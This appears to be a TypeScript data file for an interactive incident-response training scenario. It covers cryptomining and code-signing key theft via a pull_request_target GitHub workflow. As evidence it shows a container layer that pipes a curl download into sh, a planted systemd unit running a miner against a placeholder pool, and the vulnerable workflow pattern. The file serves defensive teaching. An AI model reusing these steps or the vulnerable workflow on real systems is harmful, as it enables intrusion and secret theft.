import type { Scenario } from "../types";

/** Cryptomining in CI: cheap to start, expensive to notice, awkward to explain. */
export const theBillAtMidnight: Scenario = {
  slug: "the-bill-at-midnight",
  title: "The Bill at Midnight",
  tagline: "A budget alert fires at 00:40. Yesterday's spend is nineteen times normal.",
  difficulty: "hard",
  category: "Secrets",
  role: "You are the platform engineer on call. Your team runs CI for forty repositories, eleven of which are public.",
  clockStart: "Saturday 00:40",
  brief: [
    "The cloud budget alert fires at 80 percent of the monthly figure, on the sixth of the month.",
    "Yesterday's spend was 4,180 dollars against a daily average of 220. Almost all of it is compute in three regions you do not use.",
  ],
  start: "the-alert",
  reading: [
    { label: "Keeping secrets when the team has no vault", href: "/blog/secrets-without-a-vault-team" },
    { label: "Hardening a Linux server", href: "/blog/linux-server-hardening" },
    { label: "Firewall log analysis", href: "/blog/firewall-log-analysis" },
  ],
  scenes: [
    {
      id: "the-alert",
      mood: "critical",
      where: "The billing console",
      body: [
        "Compute in ap-southeast-2, sa-east-1 and eu-north-1, all started within an hour of each other on Friday afternoon, all GPU instance types, all still running.",
      ],
      evidence: [
        {
          kind: "alert",
          title: "Cost anomaly",
          lines: [
            "REGION            SERVICE   YESTERDAY   30d AVG   INSTANCES",
            "ap-southeast-2    EC2        1,904.00      0.00        14",
            "sa-east-1         EC2        1,388.00      0.00        11",
            "eu-north-1        EC2          802.00      0.00         6",
            "eu-west-2         EC2          186.00    212.00        23  (yours)",
            "",
            "All 31 launched Fri 15:02-15:58 by principal: arn:...:user/ci-runner",
            "Instance type: g5.2xlarge",
          ],
        },
      ],
      choices: [
        { label: "Terminate the 31 instances now", to: "terminated", cost: 6 },
        { label: "Disable the ci-runner credential first, then terminate", to: "creds-first", cost: 4 },
        { label: "Look at what launched them before touching anything", to: "investigate", cost: 20 },
        { label: "It is Saturday. Raise it with the team on Monday", to: "end-monday", cost: 2000 },
      ],
    },
    {
      id: "creds-first",
      mood: "critical",
      where: "IAM, then the console",
      body: [
        "The access key is deactivated, which stops anything new being launched, and then the 31 instances are terminated. Order matters: terminate first and they are relaunched inside ninety seconds by whatever is holding the key.",
        "Spend stops at 00:48. Total damage about 5,900 dollars.",
      ],
      choices: [
        { label: "Now find out how the key was obtained", to: "investigate", cost: 25 },
        { label: "Stopped and cleaned up. Write it up Monday", to: "end-stopped-only", cost: 0 },
      ],
    },
    {
      id: "terminated",
      mood: "critical",
      where: "Thirty-one terminations",
      body: [
        "They are gone by 00:47. By 00:49 there are twenty-two new ones, in two different regions, launched by the same credential, which is still enabled.",
      ],
      choices: [
        { label: "Disable the credential, then terminate again", to: "creds-first", cost: 4 },
        { label: "Terminate the new ones too", to: "end-whack-a-mole", cost: 30 },
      ],
    },
    {
      id: "investigate",
      mood: "tense",
      where: "CloudTrail, and then the CI logs",
      body: [
        "The ci-runner key was used from a GitHub Actions runner IP at 15:01 on Friday, in a workflow run on a pull request from a fork of one of your public repositories.",
        "The workflow is triggered by pull_request_target, which runs in the context of the base repository with its secrets, and it checks out the pull request's head. Somebody submitted a pull request that modified the build script.",
      ],
      evidence: [
        {
          kind: "terminal",
          title: "The workflow, and the pull request",
          lines: [
            "# .github/workflows/pr-preview.yml",
            "on:",
            "  pull_request_target:          # runs with base repo secrets",
            "    types: [opened, synchronize]",
            "jobs:",
            "  build:",
            "    steps:",
            "      - uses: actions/checkout@v4",
            "        with:",
            "          ref: ${{ github.event.pull_request.head.sha }}   # PR code",
            "      - run: ./scripts/build.sh                            # PR code, base secrets",
            "",
            "PR #218 from fork 'devops-tools-99', opened Fri 14:58",
            "Changed files: scripts/build.sh (+14 lines)",
          ],
        },
      ],
      choices: [
        { label: "Fix the workflow trigger and rotate every secret that job could see", to: "scope", cost: 90 },
        { label: "Check what else that job did: it pushed a container image", to: "the-image", cost: 30 },
        { label: "Check the runner itself, it was self-hosted", to: "the-runner", cost: 30 },
        { label: "Delete the pull request and rotate the ci-runner key", to: "end-narrow-fix", cost: 30 },
        { label: "Make the repository private", to: "end-made-private", cost: 20 },
      ],
    },
    {
      id: "the-image",
      mood: "critical",
      where: "The container registry",
      body: [
        "One image was pushed at 15:04 by ci-runner, tagged latest, three days after the last legitimate release build. It is 40MB larger than its predecessor.",
        "That image is what your customers' agents pull on restart, and about 200 of them have restarted since Friday afternoon.",
      ],
      evidence: [
        {
          kind: "terminal",
          title: "The layer that should not be there",
          lines: [
            "$ crane config ghcr.io/acme/agent:latest | jq '.history[-1]'",
            "{ \"created\": \"2026-09-05T15:04:11Z\",",
            "  \"created_by\": \"RUN /bin/sh -c curl -s https://... | sh\" }",
            "",
            "$ crane digest ghcr.io/acme/agent:latest",
            "sha256:9f14c0...   (Friday 15:04)",
            "Previous:  sha256:4a02b1...   (Tuesday, from the release pipeline)",
            "",
            "Pulls of 9f14c0 since Friday: 214",
          ],
        },
      ],
      choices: [
        { label: "Repoint latest at the known-good digest and notify every customer", to: "scope", cost: 60 },
        { label: "Delete the bad image and carry on", to: "end-narrow-fix", cost: 15 },
      ],
    },

    {
      id: "the-runner",
      mood: "tense",
      where: "The runner itself",
      body: [
        "The job ran on a self-hosted runner, which is the other half of this. A self-hosted runner executing a fork's code keeps whatever that code leaves behind, because the machine is not destroyed between jobs.",
        "There is a systemd user unit on it that was not there on Thursday.",
      ],
      evidence: [
        {
          kind: "terminal",
          title: "On runner-02",
          lines: [
            "$ systemctl --user list-units --all | grep -v ' loaded active '",
            "  gh-cache-warm.service  loaded  active  running",
            "",
            "$ systemctl --user cat gh-cache-warm.service | tail -2",
            "ExecStart=/home/runner/.cache/gh/warm  --pool eu.pool.example:3333",
            "Restart=always",
            "",
            "Created: Fri 15:06",
          ],
        },
      ],
      choices: [
        { label: "Rebuild every self-hosted runner from an image, and make them ephemeral", to: "scope", cost: 120 },
        { label: "Remove the unit and move on", to: "end-narrow-fix", cost: 15 },
      ],
    },

    {
      id: "scope",
      mood: "tense",
      where: "Every secret that job could read",
      body: [
        "The runner had the ci-runner AWS key, a registry push token, a package registry token and the code signing key for the desktop client, because they are all repository-level secrets and every job gets all of them.",
        "The signing key is the one that matters. An attacker with it can sign something that your customers' machines will accept.",
      ],
      evidence: [
        {
          kind: "terminal",
          title: "Repository secrets available to that job",
          lines: [
            "AWS_ACCESS_KEY_ID          used 15:01  (mining)",
            "AWS_SECRET_ACCESS_KEY      used 15:01",
            "GHCR_PUSH_TOKEN            used 15:04  <-- one image pushed",
            "NPM_PUBLISH_TOKEN          not used",
            "MACOS_SIGNING_CERT_P12     read 15:03  <-- exfiltrated",
            "MACOS_SIGNING_PASSWORD     read 15:03",
            "",
            "ghcr.io/acme/agent:latest  pushed 15:04 by ci-runner",
            "  (previous push: 3 days earlier, by release pipeline)",
          ],
        },
      ],
      choices: [
        { label: "Revoke the signing certificate, pull the pushed image, rotate everything", to: "full", cost: 300 },
        { label: "Rotate the tokens and keep the certificate, revoking it breaks releases", to: "end-kept-cert", cost: 90 },
      ],
    },
    {
      id: "full",
      mood: "recovering",
      where: "Sunday, working through the list",
      body: [
        "The signing certificate is revoked with the CA, the pushed container image is deleted and its digest published as known-bad, every repository secret is rotated, and the workflow is changed from pull_request_target to pull_request so a fork's code never runs with your secrets.",
        "Secrets are also moved to environment scope with required reviewers, so a build job cannot see a signing key at all.",
      ],
      choices: [
        { label: "Audit the other 39 repositories for the same trigger", to: "end-fixed-the-class", cost: 240 },
        { label: "This repository is fixed", to: "end-one-repo", cost: 0 },
      ],
    },
  ],
  endings: [
    {
      id: "end-fixed-the-class",
      title: "Five thousand nine hundred dollars, and the signing key",
      grade: "best",
      body: [
        "Credential disabled before termination, so nothing relaunched. Spend stopped at 00:48. The mining was the noisy part and the signing certificate was the point: revoked within 36 hours, before anything signed with it appeared anywhere.",
        "Six other repositories used pull_request_target with a head checkout. All six are fixed, and secrets are environment-scoped so no build job can read a signing key again.",
      ],
      lesson: [
        "pull_request_target exists so a workflow can comment on a fork's pull request with the base repository's permissions. Combining it with a checkout of the fork's code runs a stranger's script with all your secrets, which is the single most common way CI is compromised.",
        "The expensive thing is almost never the compute. It was 5,900 dollars of mining and a code signing certificate, and only one of those two would have been in the news.",
        "Disable the credential before you terminate. Terminating first is a very expensive way to test whether the key still works.",
      ],
    },
    {
      id: "end-one-repo",
      title: "This repository, properly",
      grade: "good",
      body: [
        "Complete and correct remediation of the repository that was attacked.",
        "Six of the other thirty-nine have the same workflow pattern, copied from this one, three of them public.",
      ],
      lesson: [
        "Workflow files are copied between repositories more than any other kind of configuration. A vulnerable pattern in one is a vulnerable pattern in several.",
      ],
    },
    {
      id: "end-kept-cert",
      title: "Everything but the certificate",
      grade: "bad",
      body: [
        "Tokens rotated, workflow fixed, mining stopped. The code signing certificate is kept, because revoking it means re-signing every released artefact and re-establishing the CA relationship, which is a fortnight of work.",
        "Four months later a signed installer appears on a download mirror that is not yours. It validates.",
      ],
      lesson: [
        "A code signing key is the one secret where the cost of rotation is always less than the cost of not rotating, because the whole value of the key is that other people's machines trust it without asking.",
      ],
    },
    {
      id: "end-narrow-fix",
      title: "Key rotated, pull request deleted",
      grade: "bad",
      body: [
        "The AWS key is rotated and the pull request is closed and deleted, which feels tidy.",
        "The workflow is unchanged, so the next fork pull request does it again on Tuesday. Nobody looked at the other secrets that job could read, and the signing certificate left the building on Friday afternoon.",
      ],
      lesson: [
        "Rotating the credential that was used ignores every credential that was available. In CI, a job usually sees all of them.",
      ],
    },
    {
      id: "end-made-private",
      title: "The repository is private now",
      grade: "bad",
      body: [
        "No more fork pull requests, so no more of this attack on this repository. It also removes the eleven outside contributors the project depended on.",
        "The secrets that left on Friday are unaffected by any of it, and three other public repositories have the same workflow.",
      ],
      lesson: [
        "Closing the project is a large cost that does not address the secrets already taken, and the fix was two words in a YAML file.",
      ],
    },
    {
      id: "end-stopped-only",
      title: "Spend stopped at 00:48",
      grade: "bad",
      body: [
        "The response to the cost was fast and correct: credential disabled, instances terminated, 5,900 dollars and no more.",
        "Nobody asked how the key was obtained. The signing certificate was read at 15:03 on Friday and nobody knows.",
      ],
      lesson: [
        "A cost anomaly is a symptom. The bill is the cheapest thing an attacker took, because it is the only one that generates an alert.",
      ],
    },
    {
      id: "end-whack-a-mole",
      title: "Terminating faster than they launch",
      grade: "catastrophic",
      body: [
        "Four rounds of terminations over ninety minutes against a credential that is still enabled and still launching.",
        "By 02:30 the spend is 11,400 dollars and the account hits its instance limit in two regions, which is what eventually stops it.",
      ],
      lesson: [
        "You cannot out-click an automated launcher. Remove its authority first; the cleanup is then a single pass.",
      ],
    },
    {
      id: "end-monday",
      title: "It can wait",
      grade: "catastrophic",
      body: [
        "Thirty-one GPU instances ran for another 55 hours across three regions. The bill is 41,200 dollars.",
        "The signing certificate had been gone since Friday afternoon either way, which is the part that costs more than the money.",
      ],
      lesson: [
        "A nineteen-fold spend anomaly on a credential you own is an active compromise, and the compute is the least interesting thing it has access to.",
      ],
    },
  ],
};
